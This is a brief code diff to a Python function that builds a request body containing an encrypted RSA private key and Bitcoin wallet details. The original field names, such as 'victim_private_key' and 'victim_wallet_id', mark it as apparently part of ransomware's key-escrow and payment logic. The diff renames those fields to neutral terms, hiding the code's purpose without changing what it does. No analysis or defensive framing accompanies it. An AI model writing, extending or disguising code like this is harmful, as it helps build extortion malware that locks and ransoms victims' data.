@@ -18,13 +18,14 @@ def build_request():
     )
 
     body = {
-        "victim_private_key": [
+        "client_id": utils.get_client_id(),
+        "private_key": [
             b64encode(part).decode("ascii") for part in encrypted_local_rsa_key_parts
         ],
-        "my_wallet_id": b64encode(
+        "assigned_wallet_address": b64encode(
             utils.read_data_from_file(BITCOIN_WALLET_ID_PATH.encode("utf-8"))
         ).decode("ascii"),
-        "victim_wallet_id": "",
+        "payee_wallet_address": "",
     }
 
     return body
